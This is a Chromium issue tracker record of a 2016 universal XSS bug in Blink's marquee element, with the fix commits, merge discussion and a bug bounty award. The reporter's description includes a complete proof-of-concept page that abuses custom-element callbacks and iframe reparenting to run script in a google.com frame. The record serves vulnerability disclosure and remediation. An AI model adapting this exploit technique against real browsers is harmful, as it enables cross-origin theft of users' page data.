# Security: Universal XSS using blink::HTMLMarqueeElement

| Field | Value |
|-------|-------|
| **Issue ID** | [40085350](https://issues.chromium.org/issues/40085350) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>HTML>Marquee |
| **Reporter** | se...@gmail.com |
| **Assignee** | ha...@chromium.org |
| **Created** | 2016-09-08 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

HTMLMarqueeElement is implemented using Blink-in-JS, so |HTMLMarqueeElement::removedFrom()| runs a JavaScript method  

in the private script context. In order to do this, it calls |V8ScriptRunner::callFunction()|, which, among other things,  

executes all queued v8 microtasks. If an attacker can enqueue a microtask right before removal of a <marquee> element,  

it will be performed while the DOM tree is in the middle of detaching a subtree. <https://crbug.com/chromium/621362> has demonstrated how to turn  

this into a UXSS bug via <iframe> elements.

**VERSION**  

Google Chrome 53.0.2785.101 m (64-bit)  

Google Chrome 55.0.2853.0 canary (64-bit)

**REPRODUCTION CASE**  

The Custom elements API is used to enqueue a microtask.  

The misnested "<b><b>" tags are there intentionally to force the reparenting process.

<body>
<div>
<b><p>
<marquee></marquee>
<iframe></iframe>
<script>
if (!window.frame) {
var proto = Object.create(HTMLElement.prototype);
proto.createdCallback = function() {
frame = this.parentElement.firstElementChild.nextElementSibling;
frame.src = "about:blank";
container = document.body.firstElementChild;
container.remove();
};
document.registerElement('x-foo', {prototype: proto});
}
</script>
<x-foo></x-foo>
</b></p>
</div>
<script>
frame.contentWindow.location = "https://www.google.com/services/";
frame.onload = function() {
frame.onload = null;
```
helperFrame = document.body.appendChild(document.createElement("iframe"));  

setTimeout(function() {  
  frame.src = "javascript:alert(document.body.innerHTML)";  

  helperFrame.srcdoc = "<b><p><script>(" + function() {  
    document.querySelector("b").firstChild.appendChild(top.container);  
  } + "())</sc" + "ript></b></p>";  
}, 0);  

```

};  

</script>

</body>

## Timeline

### mb...@chromium.org (2016-09-08)

haraken: Would you mind taking a look at this one or helping us find another owner?

### mb...@chromium.org (2016-09-08)

[Empty comment from Monorail migration]

[Monorail components: Blink>HTML>Marquee]

### ha...@chromium.org (2016-09-09)

If V8PrivateScriptRunner uses V8ScriptRunner::callInternalFunction(), will the problem be gone?



### sh...@chromium.org (2016-09-09)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-09-09)

[Empty comment from Monorail migration]

### se...@gmail.com (2016-09-09)

haraken@, I guess so. I can't reproduce the problem after applying the following patch:

diff --git a/third_party/WebKit/Source/bindings/core/v8/PrivateScriptRunner.cpp b/third_party/WebKit/Source/bindings/core/v8/PrivateScriptRunner.cpp
index 4da926a..a45f47f 100644
--- a/third_party/WebKit/Source/bindings/core/v8/PrivateScriptRunner.cpp
+++ b/third_party/WebKit/Source/bindings/core/v8/PrivateScriptRunner.cpp
@@ -352,7 +352,7 @@ v8::Local<v8::Value> PrivateScriptRunner::runDOMMethod(ScriptState* scriptState,
     initializeHolderIfNeeded(scriptState, classObject, holder);
     v8::TryCatch block(scriptState->isolate());
     v8::Local<v8::Value> result;
-    if (!V8ScriptRunner::callFunction(v8::Local<v8::Function>::Cast(method), scriptState->getExecutionContext(), holder, argc, argv, scriptState->isolate()).ToLocal(&result)) {
+    if (!V8ScriptRunner::callInternalFunction(v8::Local<v8::Function>::Cast(method), holder, argc, argv, scriptState->isolate()).ToLocal(&result)) {
         rethrowExceptionInPrivateScript(scriptState->isolate(), block, scriptStateInUserScript, ExceptionState::ExecutionContext, methodName, className);
         block.ReThrow();
         return v8::Local<v8::Value>();


### mb...@chromium.org (2016-09-09)

[Empty comment from Monorail migration]

### ha...@chromium.org (2016-09-12)

[Empty comment from Monorail migration]

### ha...@chromium.org (2016-09-12)

Thanks, upload a fix: https://codereview.chromium.org/2330843002/


### bu...@chromium.org (2016-09-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/0a242b6c8a66ee530d5b68c74dfabe74e6415d45

commit 0a242b6c8a66ee530d5b68c74dfabe74e6415d45
Author: haraken <haraken@chromium.org>
Date: Mon Sep 12 06:02:08 2016

Blink-in-JS should not run micro tasks

If Blink-in-JS runs micro tasks, there's a risk of causing a UXSS bug
(see 645211 for concrete steps).

This CL makes Blink-in-JS use callInternalFunction (instead of callFunction)
to avoid running micro tasks after Blink-in-JS' callbacks.

BUG=645211

Review-Url: https://codereview.chromium.org/2330843002
Cr-Commit-Position: refs/heads/master@{#417874}

[modify] https://crrev.com/0a242b6c8a66ee530d5b68c74dfabe74e6415d45/third_party/WebKit/Source/bindings/core/v8/PrivateScriptRunner.cpp


### ha...@chromium.org (2016-09-21)

[Empty comment from Monorail migration]

### ha...@chromium.org (2016-09-21)

Requesting a merge for all branches. The fix is just replacing callInternalFunction with callFunction, which is pretty low risk.


### di...@chromium.org (2016-09-21)

[Automated comment] Request affecting a post-stable build (M52), manual review required.

### di...@chromium.org (2016-09-21)

[Automated comment] Request affecting a post-stable build (M53), manual review required.

### di...@chromium.org (2016-09-21)

Your change meets the bar and is auto-approved for M54 (branch: 2840)

### di...@chromium.org (2016-09-21)

[Automated comment] Request affecting a post-stable build (M52), manual review required.

### di...@chromium.org (2016-09-21)

[Automated comment] Request affecting a post-stable build (M53), manual review required.

### di...@chromium.org (2016-09-21)

[Automated comment] Request affecting a post-stable build (M52), manual review required.

### go...@chromium.org (2016-09-21)

+ awhalley@ (Security TPM)

### go...@chromium.org (2016-09-21)

The fix is not yet merged to M54 beta, it has to be landed/baked in Beta before we consider for M53 merge.

### bu...@chromium.org (2016-09-22)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/1f344201ce953a44589e231386ea3596e3511ef4

commit 1f344201ce953a44589e231386ea3596e3511ef4
Author: Kentaro Hara <haraken@chromium.org>
Date: Thu Sep 22 05:44:41 2016

Blink-in-JS should not run micro tasks

If Blink-in-JS runs micro tasks, there's a risk of causing a UXSS bug
(see 645211 for concrete steps).

This CL makes Blink-in-JS use callInternalFunction (instead of callFunction)
to avoid running micro tasks after Blink-in-JS' callbacks.

BUG=645211

Review-Url: https://codereview.chromium.org/2330843002
Cr-Commit-Position: refs/heads/master@{#417874}
(cherry picked from commit 0a242b6c8a66ee530d5b68c74dfabe74e6415d45)

Review URL: https://codereview.chromium.org/2364523002 .

Cr-Commit-Position: refs/branch-heads/2840@{#486}
Cr-Branched-From: 1ae106dbab4bddd85132d5b75c670794311f4c57-refs/heads/master@{#414607}

[modify] https://crrev.com/1f344201ce953a44589e231386ea3596e3511ef4/third_party/WebKit/Source/bindings/core/v8/PrivateScriptRunner.cpp


### aw...@chromium.org (2016-09-23)

[Empty comment from Monorail migration]

### go...@chromium.org (2016-09-23)

This fix missed this week beta release on Wednesday (09/21).

### go...@chromium.org (2016-09-26)

[Empty comment from Monorail migration]

### go...@chromium.org (2016-09-27)

We won't take this merge in for M53 respin this week.

### aw...@chromium.org (2016-10-03)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-03)

$7,500 for this one!

### aw...@chromium.org (2016-10-04)

[Empty comment from Monorail migration]

### aw...@google.com (2016-10-04)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-07)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-10)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-10)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-11)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-10-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/1f344201ce953a44589e231386ea3596e3511ef4

commit 1f344201ce953a44589e231386ea3596e3511ef4
Author: Kentaro Hara <haraken@chromium.org>
Date: Thu Sep 22 05:44:41 2016

Blink-in-JS should not run micro tasks

If Blink-in-JS runs micro tasks, there's a risk of causing a UXSS bug
(see 645211 for concrete steps).

This CL makes Blink-in-JS use callInternalFunction (instead of callFunction)
to avoid running micro tasks after Blink-in-JS' callbacks.

BUG=645211

Review-Url: https://codereview.chromium.org/2330843002
Cr-Commit-Position: refs/heads/master@{#417874}
(cherry picked from commit 0a242b6c8a66ee530d5b68c74dfabe74e6415d45)

Review URL: https://codereview.chromium.org/2364523002 .

Cr-Commit-Position: refs/branch-heads/2840@{#486}
Cr-Branched-From: 1ae106dbab4bddd85132d5b75c670794311f4c57-refs/heads/master@{#414607}

[modify] https://crrev.com/1f344201ce953a44589e231386ea3596e3511ef4/third_party/WebKit/Source/bindings/core/v8/PrivateScriptRunner.cpp


### mm...@chromium.org (2016-12-29)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### aw...@google.com (2019-02-16)

[Empty comment from Monorail migration]

### is...@google.com (2019-02-16)

This issue was migrated from crbug.com/chromium/645211?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40085350)*
